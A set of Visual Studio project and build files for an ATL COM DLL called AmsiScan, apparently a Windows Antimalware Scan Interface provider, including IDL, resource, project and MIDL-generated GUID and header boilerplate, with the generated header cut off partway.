`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/AmsiScan.def`:

```def
; AmsiScan.def : Declares the module parameters.

LIBRARY

EXPORTS
	DllCanUnloadNow		PRIVATE
	DllGetClassObject	PRIVATE
	DllRegisterServer	PRIVATE
	DllUnregisterServer	PRIVATE
	DllInstall		PRIVATE

```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/AmsiScan.idl`:

```idl
// AmsiScan.idl : IDL source for AmsiScan
//

// This file will be processed by the MIDL tool to
// produce the type library (AmsiScan.tlb) and marshalling code.

import "oaidl.idl";
import "ocidl.idl";

[
	object,
	uuid(05025dfe-70d5-4b61-a55a-aa21585d4cb2),
	dual,
	nonextensible,
	pointer_default(unique)
]
interface IAmsiProvider : IDispatch
{
};
[
	uuid(508c88ef-ca97-4107-a022-6025892ef192),
	version(1.0),
]
library AmsiScanLib
{
	importlib("stdole2.tlb");
	[
		uuid(1c0643e1-5b0a-4420-9b76-0de9264b4c59)
	]
	coclass AmsiProvider
	{
		[default] interface IAmsiProvider;
	};
};

import "shobjidl.idl";

```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/AmsiScan.rc`:

```rc
// Microsoft Visual C++ generated resource script.
//
#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#ifndef APSTUDIO_INVOKED
#include "targetver.h"
#endif
#include "winres.h"
#include "verrsrc.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE 
BEGIN
    "resource.h\0"
END

2 TEXTINCLUDE 
BEGIN
    "#ifndef APSTUDIO_INVOKED\r\n"
    "#include ""targetver.h""\r\n"
    "#endif\r\n"
    "#include ""winres.h""\r\n"
    "#include ""verrsrc.h""\r\n"
    "\0"
END

3 TEXTINCLUDE 
BEGIN
    "1 TYPELIB ""AmsiScan.tlb""\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED


/////////////////////////////////////////////////////////////////////////////
//
// Version
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 1,0,0,1
 PRODUCTVERSION 1,0,0,1
 FILEFLAGSMASK 0x3fL
#ifdef _DEBUG
 FILEFLAGS 0x1L
#else
 FILEFLAGS 0x0L
#endif
 FILEOS 0x40004L
 FILETYPE 0x2L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"
        BEGIN
            VALUE "CompanyName", "TODO: <Company name>"
            VALUE "FileDescription", "TODO: <File description>"
            VALUE "FileVersion", "1.0.0.1"
            VALUE "LegalCopyright", "TODO: (c) <Company name>.  All rights reserved."
            VALUE "InternalName", "AmsiScan.dll"
            VALUE "OriginalFilename", "AmsiScan.dll"
            VALUE "ProductName", "TODO: <Product name>"
            VALUE "ProductVersion", "1.0.0.1"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END


/////////////////////////////////////////////////////////////////////////////
//
// REGISTRY
//

IDR_AMSISCAN            REGISTRY                "AmsiScan.rgs"

IDR_AMSIPROVIDER        REGISTRY                "AmsiProvider.rgs"


/////////////////////////////////////////////////////////////////////////////
//
// String Table
//

STRINGTABLE
BEGIN
    IDS_PROJNAME            "AmsiScan"
END

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//
1 TYPELIB "AmsiScan.tlb"

/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED


```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/AmsiScan.rgs`:

```rgs
HKCR
{
}

```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/AmsiScan.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{D131A205-F090-4CF5-8441-32074FE5398E}</ProjectGuid>
    <Keyword>AtlProj</Keyword>
    <WindowsTargetPlatformVersion>10.0.17134.0</WindowsTargetPlatformVersion>
    <ProjectName>AmsiScanServer</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <IgnoreImportLibrary>true</IgnoreImportLibrary>
    <LinkIncremental>true</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <IgnoreImportLibrary>true</IgnoreImportLibrary>
    <LinkIncremental>true</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <IgnoreImportLibrary>true</IgnoreImportLibrary>
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <IgnoreImportLibrary>true</IgnoreImportLibrary>
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>WIN32;_WINDOWS;_DEBUG;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <SDLCheck>true</SDLCheck>
    </ClCompile>
    <Midl>
      <MkTypLibCompatible>false</MkTypLibCompatible>
      <TargetEnvironment>Win32</TargetEnvironment>
      <PreprocessorDefinitions>_DEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <HeaderFileName>AmsiScan_i.h</HeaderFileName>
      <InterfaceIdentifierFileName>AmsiScan_i.c</InterfaceIdentifierFileName>
      <ProxyFileName>AmsiScan_p.c</ProxyFileName>
      <GenerateStublessProxies>true</GenerateStublessProxies>
      <TypeLibraryName>$(IntDir)AmsiScan.tlb</TypeLibraryName>
      <DllDataFileName />
      <ValidateAllParameters>true</ValidateAllParameters>
    </Midl>
    <ResourceCompile>
      <Culture>0x0409</Culture>
      <AdditionalIncludeDirectories>$(IntDir);%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <PreprocessorDefinitions>_DEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ResourceCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <ModuleDefinitionFile>.\AmsiScan.def</ModuleDefinitionFile>
      <RegisterOutput>false</RegisterOutput>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>_WINDOWS;_DEBUG;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <SDLCheck>true</SDLCheck>
    </ClCompile>
    <Midl>
      <MkTypLibCompatible>false</MkTypLibCompatible>
      <PreprocessorDefinitions>_DEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <HeaderFileName>AmsiScan_i.h</HeaderFileName>
      <InterfaceIdentifierFileName>AmsiScan_i.c</InterfaceIdentifierFileName>
      <ProxyFileName>AmsiScan_p.c</ProxyFileName>
      <GenerateStublessProxies>true</GenerateStublessProxies>
      <TypeLibraryName>$(IntDir)AmsiScan.tlb</TypeLibraryName>
      <DllDataFileName />
      <ValidateAllParameters>true</ValidateAllParameters>
    </Midl>
    <ResourceCompile>
      <Culture>0x0409</Culture>
      <AdditionalIncludeDirectories>$(IntDir);%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <PreprocessorDefinitions>_DEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ResourceCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <ModuleDefinitionFile>.\AmsiScan.def</ModuleDefinitionFile>
      <RegisterOutput>false</RegisterOutput>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MinSpace</Optimization>
      <PreprocessorDefinitions>WIN32;_WINDOWS;NDEBUG;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <SDLCheck>true</SDLCheck>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
    </ClCompile>
    <Midl>
      <MkTypLibCompatible>false</MkTypLibCompatible>
      <TargetEnvironment>Win32</TargetEnvironment>
      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <HeaderFileName>AmsiScan_i.h</HeaderFileName>
      <InterfaceIdentifierFileName>AmsiScan_i.c</InterfaceIdentifierFileName>
      <ProxyFileName>AmsiScan_p.c</ProxyFileName>
      <GenerateStublessProxies>true</GenerateStublessProxies>
      <TypeLibraryName>$(IntDir)AmsiScan.tlb</TypeLibraryName>
      <DllDataFileName />
      <ValidateAllParameters>true</ValidateAllParameters>
    </Midl>
    <ResourceCompile>
      <Culture>0x0409</Culture>
      <AdditionalIncludeDirectories>$(IntDir);%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ResourceCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <ModuleDefinitionFile>.\AmsiScan.def</ModuleDefinitionFile>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <RegisterOutput>false</RegisterOutput>
      <GenerateDebugInformation>false</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MinSpace</Optimization>
      <PreprocessorDefinitions>_WINDOWS;NDEBUG;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <SDLCheck>true</SDLCheck>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
    </ClCompile>
    <Midl>
      <MkTypLibCompatible>false</MkTypLibCompatible>
      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <HeaderFileName>AmsiScan_i.h</HeaderFileName>
      <InterfaceIdentifierFileName>AmsiScan_i.c</InterfaceIdentifierFileName>
      <ProxyFileName>AmsiScan_p.c</ProxyFileName>
      <GenerateStublessProxies>true</GenerateStublessProxies>
      <TypeLibraryName>$(IntDir)AmsiScan.tlb</TypeLibraryName>
      <DllDataFileName />
      <ValidateAllParameters>true</ValidateAllParameters>
    </Midl>
    <ResourceCompile>
      <Culture>0x0409</Culture>
      <AdditionalIncludeDirectories>$(IntDir);%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ResourceCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <ModuleDefinitionFile>.\AmsiScan.def</ModuleDefinitionFile>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <RegisterOutput>false</RegisterOutput>
      <GenerateDebugInformation>false</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="AmsiProvider.cpp" />
    <ClCompile Include="AmsiScan.cpp" />
    <ClCompile Include="AmsiScan_i.c">
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">false</CompileAsManaged>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">false</CompileAsManaged>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">false</CompileAsManaged>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Release|x64'">false</CompileAsManaged>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
      </PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
      </PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
      </PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
      </PrecompiledHeader>
    </ClCompile>
    <ClCompile Include="dllmain.cpp">
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">false</CompileAsManaged>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">false</CompileAsManaged>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">false</CompileAsManaged>
      <CompileAsManaged Condition="'$(Configuration)|$(Platform)'=='Release|x64'">false</CompileAsManaged>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
      </PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
      </PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
      </PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
      </PrecompiledHeader>
    </ClCompile>
    <ClCompile Include="stdafx.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="AmsiProvider.h" />
    <ClInclude Include="AmsiScan_i.h" />
    <ClInclude Include="dllmain.h" />
    <ClInclude Include="Resource.h" />
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="targetver.h" />
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="AmsiScan.rc" />
  </ItemGroup>
  <ItemGroup>
    <None Include="AmsiProvider.rgs" />
    <None Include="AmsiScan.def" />
    <None Include="AmsiScan.rgs" />
  </ItemGroup>
  <ItemGroup>
    <Midl Include="AmsiScan.idl" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/AmsiScan.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Generated Files">
      <UniqueIdentifier>{58d1c9d3-a7e5-4f1a-b441-007441745fe5}</UniqueIdentifier>
      <SourceControlFiles>False</SourceControlFiles>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="stdafx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="AmsiScan.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="dllmain.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="AmsiScan_i.c">
      <Filter>Generated Files</Filter>
    </ClCompile>
    <ClCompile Include="AmsiProvider.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="targetver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Resource.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="dllmain.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="AmsiScan_i.h">
      <Filter>Generated Files</Filter>
    </ClInclude>
    <ClInclude Include="AmsiProvider.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="AmsiScan.rc">
      <Filter>Resource Files</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="AmsiScan.rgs">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="AmsiScan.def">
      <Filter>Source Files</Filter>
    </None>
    <None Include="AmsiProvider.rgs">
      <Filter>Resource Files</Filter>
    </None>
  </ItemGroup>
  <ItemGroup>
    <Midl Include="AmsiScan.idl">
      <Filter>Source Files</Filter>
    </Midl>
  </ItemGroup>
</Project>
```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/AmsiScan.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/AmsiScan_i.c`:

```c


/* this ALWAYS GENERATED file contains the IIDs and CLSIDs */

/* link this file in with the server and any clients */


 /* File created by MIDL compiler version 8.01.0622 */
/* at Mon Jan 18 19:14:07 2038
 */
/* Compiler settings for AmsiScan.idl:
    Oicf, W1, Zp8, env=Win64 (32b run), target_arch=AMD64 8.01.0622 
    protocol : all , ms_ext, c_ext, robust
    error checks: allocation ref bounds_check enum stub_data 
    VC __declspec() decoration level: 
         __declspec(uuid()), __declspec(selectany), __declspec(novtable)
         DECLSPEC_UUID(), MIDL_INTERFACE()
*/
/* @@MIDL_FILE_HEADING(  ) */



#ifdef __cplusplus
extern "C"{
#endif 


#include <rpc.h>
#include <rpcndr.h>

#ifdef _MIDL_USE_GUIDDEF_

#ifndef INITGUID
#define INITGUID
#include <guiddef.h>
#undef INITGUID
#else
#include <guiddef.h>
#endif

#define MIDL_DEFINE_GUID(type,name,l,w1,w2,b1,b2,b3,b4,b5,b6,b7,b8) \
        DEFINE_GUID(name,l,w1,w2,b1,b2,b3,b4,b5,b6,b7,b8)

#else // !_MIDL_USE_GUIDDEF_

#ifndef __IID_DEFINED__
#define __IID_DEFINED__

typedef struct _IID
{
    unsigned long x;
    unsigned short s1;
    unsigned short s2;
    unsigned char  c[8];
} IID;

#endif // __IID_DEFINED__

#ifndef CLSID_DEFINED
#define CLSID_DEFINED
typedef IID CLSID;
#endif // CLSID_DEFINED

#define MIDL_DEFINE_GUID(type,name,l,w1,w2,b1,b2,b3,b4,b5,b6,b7,b8) \
        EXTERN_C __declspec(selectany) const type name = {l,w1,w2,{b1,b2,b3,b4,b5,b6,b7,b8}}

#endif // !_MIDL_USE_GUIDDEF_

MIDL_DEFINE_GUID(IID, IID_IAmsiProvider,0x05025dfe,0x70d5,0x4b61,0xa5,0x5a,0xaa,0x21,0x58,0x5d,0x4c,0xb2);


MIDL_DEFINE_GUID(IID, LIBID_AmsiScanLib,0x508c88ef,0xca97,0x4107,0xa0,0x22,0x60,0x25,0x89,0x2e,0xf1,0x92);


MIDL_DEFINE_GUID(CLSID, CLSID_AmsiProvider,0x1c0643e1,0x5b0a,0x4420,0x9b,0x76,0x0d,0xe9,0x26,0x4b,0x4c,0x59);

#undef MIDL_DEFINE_GUID

#ifdef __cplusplus
}
#endif




```

`source/AMSI/AmsiProviderATL/AmsiServer/AmsiScan/AmsiScan_i.h`:

```h


/* this ALWAYS GENERATED file contains the definitions for the interfaces */


 /* File created by MIDL compiler version 8.01.0622 */
/* at Mon Jan 18 19:14:07 2038
 */
/* Compiler settings for AmsiScan.idl:
    Oicf, W1, Zp8, env=Win64 (32b run), target_arch=AMD64 8.01.0622 
    protocol : all , ms_ext, c_ext, robust
    error checks: allocation ref bounds_check enum stub_data 
    VC __declspec() decoration level: 
         __declspec(uuid()), __declspec(selectany), __declspec(novtable)
         DECLSPEC_UUID(), MIDL_INTERFACE()
*/
/* @@MIDL_FILE_HEADING(  ) */



/* verify that the <rpcndr.h> version is high enough to compile this file*/
#ifndef __REQUIRED_RPCNDR_H_VERSION__
#define __REQUIRED_RPCNDR_H_VERSION__ 500
#endif

#include "rpc.h"
#include "rpcndr.h"

#ifndef __RPCNDR_H_VERSION__
#error this stub requires an updated version of <rpcndr.h>
#endif /* __RPCNDR_H_VERSION__ */

#ifndef COM_NO_WINDOWS_H
#include "windows.h"
#include "ole2.h"
#endif /*COM_NO_WINDOWS_H*/

#ifndef __AmsiScan_i_h__
#define __AmsiScan_i_h__

#if defined(_MSC_VER) && (_MSC_VER >= 1020)
#pragma once
#endif

/* Forward Declarations */ 

#ifndef __IAmsiProvider_FWD_DEFINED__
#define __IAmsiProvider_FWD_DEFINED__
typedef interface IAmsiProvider IAmsiProvider;

#endif 	/* __IAmsiProvider_FWD_DEFINED__ */


#ifndef __AmsiProvider_FWD_DEFINED__
#define __AmsiProvider_FWD_DEFINED__

#ifdef __cplusplus
typedef class AmsiProvider AmsiProvider;
#else
typedef struct AmsiProvider AmsiProvider;
#endif /* __cplusplus */

#endif 	/* __AmsiProvider_FWD_DEFINED__ */


/* header files for imported files */
#include "oaidl.h"
#include "ocidl.h"
#include "shobjidl.h"

#ifdef __cplusplus
extern "C"{
#endif 


#ifndef __IAmsiProvider_INTERFACE_DEFINED__
#define __IAmsiProvider_INTERFACE_DEFINED__

/* interface IAmsiProvider */
/* [unique][nonextensible][dual][uuid][object] */ 


EXTERN_C const IID IID_IAmsiProvider;

#if defined(__cplusplus) && !defined(CINTERFACE)
    
    MIDL_INTERFACE("05025dfe-70d5-4b61-a55a-aa21585d4cb2")
    IAmsiProvider : public IDispatch
    {
    public:
    };
    
    
#else 	/* C style interface */

    typedef struct IAmsiProviderVtbl
    {
        BEGIN_INTERFACE
        
        HRESULT ( STDMETHODCALLTYPE *QueryInterface )( 
            IAmsiProvider * This,
            /* [in] */ REFIID riid,
            /* [annotation][iid_is][out] */ 
            _COM_Outptr_  void **ppvObject);
        
        ULONG ( STDMETHODCALLTYPE *AddRef )( 
            IAmsiProvider * This);
        
        ULONG ( STDMETHODCALLTYPE *Release )( 
            IAmsiProvider * This);
        
        HRESULT ( STDMETHODCALLTYPE *GetTypeInfoCount )( 
            IAmsiProvider * This,
            /* [out] */ UINT *pctinfo);
        
        HRESULT ( STDMETHODCALLTYPE *GetTypeInfo )( 
            IAmsiProvider * This,
            /* [in] */ UINT iTInfo,
            /* [in] */ LCID lcid,
            /* [out] */ ITypeInfo **ppTInfo);
        
        HRESULT ( STDMETHODCALLTYPE *GetIDsOfNames )( 
            IAmsiProvider * This,
            /* [in] */ REFIID riid,
            /* [size_is][in] */ LPOLESTR *rgszNames,
            /* [range][in] */ UINT cNames,
            /* [in] */ LCID lcid,
            /* [size_is][out] */ DISPID *rgDispId);
        
        /* [local] */ HRESULT ( STDMETHODCALLTYPE *Invoke )( 
            IAmsiProvider * This,
            /* [annotation][in] */ 
            _In_  DISPID dispIdMember,
            /* [annotation][in] */ 
            _In_  REFIID riid,
            /* [annotation][in] */ 
            _In_  LCID lcid,
            /* [annotation][in] */ 
            _In_  WORD wFlags,
            /* [annotation][out][in] */ 
            _In_  DISPPARAMS *pDispParams,
            /* [annotation][out] */ 
            _Out_opt_  VARIANT *pVarResult,
            /* [annotation][out] */ 
            _Out_opt_  EXCEPINFO *pExcepInfo,
            /* [annotation][out] */ 
            _Out_opt_  UINT *puArgErr);
        
        END_INTERFACE
    } IAmsiProviderVtbl;

    interface IAmsiProvider
    {
        CONST_VTBL struct IAmsiProviderVtbl *lpVtbl;
    };

    

#ifdef COBJMACROS


#define IAmsiProvider_QueryInterface(This,riid,ppvObject)	\
    ( (This)->lpVtbl -> QueryInterface(This,riid,ppvObject) ) 

#define IAmsiProvider_AddRef(This)	\
    ( (This)->lpVtbl -> AddRef(This) ) 

#define IAmsiProvider_Release(This)	\
    ( (This)->lpVtbl -> Release(This) ) 


#define IAmsiProvider_GetTypeInfoCount(This,pctinfo)	\
    ( (This)->lpVtbl -> GetTypeInfoCount(This,pctinfo) ) 

#define IAmsiProvider_GetTypeInfo(This,iTInfo,lcid,ppTInfo)	\
    ( (This)->lpVtbl -> GetTypeInfo(This,iTInfo,lcid,ppTInfo) ) 

